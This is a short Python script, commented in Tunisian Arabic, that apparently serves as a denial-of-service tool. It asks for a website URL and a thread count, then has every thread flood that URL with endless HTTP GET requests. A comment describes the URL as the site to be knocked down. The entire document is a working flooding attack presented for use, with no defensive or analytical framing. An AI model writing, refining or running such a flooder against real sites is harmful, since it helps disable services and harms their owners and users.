import requests
import threading

#الرابط متع الموقع الي بنطيحوه 
url = input("Please can you enter the URL of the website : ")
# الفنكشن الرئيسية متع الركوستات 
def make_request():
    while True:
        try:
            response = requests.get(url)
            print(f"Status Code: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"Request failed: {e}")



threads = []

# عدد الثريدز الي تبي اديرهم 
number_of_user_threds = int(
    input(
        "Pleae can you enter the number of Threreds that you want to make response per second : "
    )
)
num_threads = number_of_user_threds

# إنشاء ثريدز لبعت الركيوستات للسيرفر 
for i in range(num_threads):
    thread = threading.Thread(target=make_request)
    threads.append(thread)
    thread.start()

#  ( :) فوق while اختياري باش يستنى الثريد امتى تم (الي هو مش حيتم بكل شوف 
for thread in threads:
    thread.join()
